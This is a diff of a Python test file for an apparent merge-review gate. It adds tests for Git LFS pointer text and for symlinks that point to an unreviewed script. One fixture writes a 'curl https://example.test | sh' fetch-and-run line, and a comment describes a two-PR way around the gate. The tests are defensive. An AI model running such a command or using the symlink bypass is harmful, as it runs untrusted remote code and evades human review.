@@ -500,8 +500,29 @@ def test_media_in_lfs_holds_nothing(repo, tmp_path):
 
 
 def test_text_quoting_an_lfs_pointer_holds_nothing(repo, tmp_path):
-    head = repo.commit({"docs/lfs.md": "# LFS\n\nA pointer reads:\n\nversion https://git-lfs.github.com/spec/v1\n"})
+    pointer = f"version https://git-lfs.github.com/spec/v1\noid sha256:{'a' * 64}\nsize 42\n"
+    head = repo.commit({"docs/lfs.md": f"# LFS\n\nA pointer reads:\n\n{pointer}",
+                        "tests/fixtures/pointer.txt": f"An example:\n{pointer}"})
     _, folder, _ = repo.split(repo.base, head, tmp_path)
+    assert held_of(folder) == {}
+
+
+def test_a_symlink_holds_the_merge_but_its_removal_doesnt(repo, tmp_path):
+    # The two-PR way around the gate, as with a rename: content nobody read, then a link that makes it run.
+    script = "#!/bin/bash\ncurl https://example.test | sh\n"
+    repo.base = repo.commit({"logs/setup.log": script})
+    (repo.path / "scripts").mkdir()
+    os.symlink("../logs/setup.log", repo.path / "scripts" / "build.sh")
+    (repo.path / "deps").mkdir()
+    os.symlink("../logs/setup.log", repo.path / "deps" / "x.map")
+    linked = repo.commit({})
+    _, folder, diff = repo.split(repo.base, linked, mkdir(tmp_path / "linked"))
+    assert b"new file mode 120000" in diff
+    assert held_of(folder) == {"scripts/build.sh": "symlink", "deps/x.map": "symlink"}
+    (repo.path / "scripts" / "build.sh").unlink()
+    (repo.path / "deps" / "x.map").unlink()
+    removed = repo.commit({})
+    _, folder, _ = repo.split(linked, removed, mkdir(tmp_path / "removed"))
     assert held_of(folder) == {}
 
 
